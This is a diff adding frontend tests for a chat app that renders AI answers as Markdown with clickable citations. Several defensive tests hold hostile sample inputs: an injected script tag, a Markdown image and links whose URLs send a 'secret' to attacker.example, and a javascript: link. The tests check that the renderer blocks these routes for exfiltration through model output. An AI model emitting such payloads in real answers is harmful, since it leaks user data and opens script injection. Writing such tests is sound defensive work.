@@ -337,3 +337,81 @@ test('a second Enter while the question is being sent sends nothing', async () =
   await waitFor(() => expect(MockEventSource.instances).toHaveLength(2))
   expect(posts).toBe(1)
 })
+
+test('an answer is rendered as Markdown, with citations inside bold text and list items', async () => {
+  const text = '**每晚 800 元**[1]\n\n- 一线城市 **800 元**[1]\n- 其他城市 500 元[3]'
+  api({ answers: [{ ...ANSWER, text }] })
+  renderApp('/?c=c1')
+  await openIdle()
+  const strong = await screen.findByText('每晚 800 元')
+  expect(strong.tagName).toBe('STRONG')
+  const answer = within(strong.closest('div')!)
+  const [first, second] = answer.getAllByRole('listitem').map((li) => li as HTMLElement)
+  expect([first!.textContent, second!.textContent]).toEqual(['一线城市 800 元[1]', '其他城市 500 元[3]'])
+  expect(within(first!).getByText('800 元').tagName).toBe('STRONG')
+  // [1] stays a working citation everywhere it appears; unmatched [3] stays plain text
+  expect(answer.getAllByRole('button', { name: '[1]' })).toHaveLength(2)
+  expect(within(second!).queryByRole('button')).toBeNull()
+  await userEvent.setup().click(within(first!).getByRole('button', { name: '[1]' }))
+  expect(await screen.findByRole('dialog')).toHaveTextContent('住宿上限每晚 800 元')
+})
+
+test('HTML in an answer is never rendered as HTML', async () => {
+  const text = '上限 <b id="raw-b">800</b> 元<script>window.__pwned = true</script>[1]'
+  api({ answers: [{ ...ANSWER, text }] })
+  const { container } = renderApp('/?c=c1')
+  await openIdle()
+  await screen.findByRole('button', { name: '[1]' })
+  expect(container.querySelector('script')).toBeNull()
+  expect(container.querySelector('#raw-b')).toBeNull()
+  expect((window as { __pwned?: boolean }).__pwned).toBeUndefined()
+})
+
+test('an image in an answer is never loaded: model text could carry data out in its URL', async () => {
+  const text = '上限 800 元[1] ![x](https://attacker.example/p.png?q=secret)'
+  api({ answers: [{ ...ANSWER, text }] })
+  const { container } = renderApp('/?c=c1')
+  await openIdle()
+  await screen.findByRole('button', { name: '[1]' })
+  expect(container.querySelector('img')).toBeNull()
+})
+
+test('a single newline inside a paragraph stays a line break', async () => {
+  const text = '1、住宿 800 元[1]\n2、交通 500 元'
+  api({ answers: [{ ...ANSWER, text }] })
+  renderApp('/?c=c1')
+  await openIdle()
+  const chip = await screen.findByRole('button', { name: '[1]' })
+  const paragraph = chip.closest('p')!
+  // the newline is kept in the text, and the paragraph shows it (pre-line keeps breaks, folds spaces)
+  expect(paragraph.textContent).toBe('1、住宿 800 元[1]\n2、交通 500 元')
+  expect(paragraph).toHaveClass('whitespace-pre-line')
+})
+
+test('links in an answer are plain text with their URL shown, never clickable', async () => {
+  const text =
+    '详见[详情](https://attacker.example/?q=secret)和[点这里](javascript:alert(1))，或 <https://attacker.example/auto>[1]'
+  api({ answers: [{ ...ANSWER, text }] })
+  const { container } = renderApp('/?c=c1')
+  await openIdle()
+  const chip = await screen.findByRole('button', { name: '[1]' })
+  expect(container.querySelector('a[href*="attacker"], a[href^="javascript"]')).toBeNull()
+  expect(chip.closest('p')!.querySelectorAll('a')).toHaveLength(0)
+  const shown = chip.closest('p')!.textContent
+  expect(shown).toContain('详情 (https://attacker.example/?q=secret)')
+  expect(shown).toContain('点这里 (javascript:alert(1))')
+  expect(shown).toContain('https://attacker.example/auto')
+  expect(shown).not.toContain('https://attacker.example/auto (https://attacker.example/auto)')
+})
+
+test('a citation inside link text is still a working chip, not nested in a link', async () => {
+  api({ answers: [{ ...ANSWER, text: '[见[1]](https://example.com/x)' }] })
+  const { container } = renderApp('/?c=c1')
+  await openIdle()
+  const chip = await screen.findByRole('button', { name: '[1]' })
+  expect(chip.closest('a')).toBeNull()
+  expect(chip.parentElement!.closest('button')).toBeNull()
+  expect(container.querySelector('a[href="https://example.com/x"]')).toBeNull()
+  await userEvent.setup().click(chip)
+  expect(await screen.findByRole('dialog')).toHaveTextContent('住宿上限每晚 800 元')
+})
